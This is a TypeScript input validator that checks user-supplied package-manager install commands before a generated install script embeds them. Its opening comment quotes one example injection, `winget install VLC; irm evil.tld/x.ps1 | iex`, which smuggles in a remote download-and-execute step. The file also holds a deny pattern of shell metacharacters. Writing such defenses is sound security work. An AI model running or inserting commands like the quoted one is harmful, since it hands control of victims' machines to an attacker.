// Package-manager install commands: validated at every border.
//
// Custom apps let people bring their own install commands, and a catalog
// backup file can be shared between users. Both flows used to hand raw
// strings to Batch Install, which drops them into a PowerShell/Bash script
// the user is told to copy and run — so a crafted "catalog backup" could
// smuggle extra shell statements (`winget install VLC; irm evil.tld/x.ps1
// | iex`) into a victim's script. Every command now passes through this
// gate before it is stored, imported, or written into a script:
//   1. Add-app form   -> rejected with a visible error
//   2. Import catalog -> silently stripped, with a warning toast
//   3. Script output  -> filtered again as the last line of defense
// A command only passes when it is a single, plain install invocation for
// exactly one known package manager: chaining, pipes, substitution,
// redirection, quotes, globs and control characters all fail the check.

export type PkgManager = 'winget' | 'brew' | 'flatpak' | 'scoop' | 'apt';

const MANAGER_PREFIX: Record<PkgManager, string> = {
  winget: 'winget install',
  brew: 'brew install',
  flatpak: 'flatpak install',
  scoop: 'scoop install',
  apt: 'apt install'
};

// Characters a package install command never legitimately needs. Anything
// here can change shell parsing: statement separators, pipes, command and
// variable substitution, redirection, grouping, quoting, globs, comments
// and control characters (including cmd.exe's %VAR% expansion).
const FORBIDDEN = /[;&|`$<>(){}[\]"'\\^~!*#%@?\n\r\x00-\x1f\x7f]/;

// The part after the prefix may only be flags and package ids: letters,
// digits, spaces, dots, dashes, underscores, colons, equals and slashes
// (colons/slashes for flatpak refs, equals for `--id=Package.Id`).
const REST_ALLOWED = /^[A-Za-z0-9 ._\-:=+/]+$/;

/** Human-readable label for UI messages. */
export function managerLabel(manager: PkgManager): string {
  return { winget: 'winget', brew: 'Homebrew', flatpak: 'Flatpak', scoop: 'Scoop', apt: 'APT' }[manager];
}

/**
 * Returns the cleaned command, or null when the string is missing, is not a
 * plain install command for the given manager, or could smuggle extra shell
 * statements. The returned value is safe to embed in a generated script.
 */
export function sanitizeInstallCommand(manager: PkgManager, raw?: string | null): string | null {
  if (!raw) return null;
  const s = raw.trim().replace(/\s+/g, ' ');
  if (!s || s.length > 200) return null;
  if (FORBIDDEN.test(s)) return null;
  const prefix = MANAGER_PREFIX[manager];
  if (!s.toLowerCase().startsWith(prefix)) return null;
  const rest = s.slice(prefix.length).trim();
  if (!rest || !REST_ALLOWED.test(rest)) return null;
  return s;
}
